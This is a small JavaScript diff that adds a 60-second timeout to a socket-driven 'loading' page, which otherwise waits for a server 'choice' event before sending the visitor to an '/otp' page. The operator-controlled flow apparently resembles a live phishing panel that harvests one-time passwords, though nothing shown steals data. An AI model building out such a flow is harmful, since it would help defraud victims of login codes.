@@ -487,6 +487,11 @@ p {
 
 	socket.emit('loading', {page:'loading'})
 
+		    let timer = setTimeout(() => {
+			    socket.emit('timeout');
+        window.location.href = '/finish';
+    }, 60000);
+
     socket.on('choice', (data) => {
         if (data.action === "good") {
              window.location.href = '/otp';
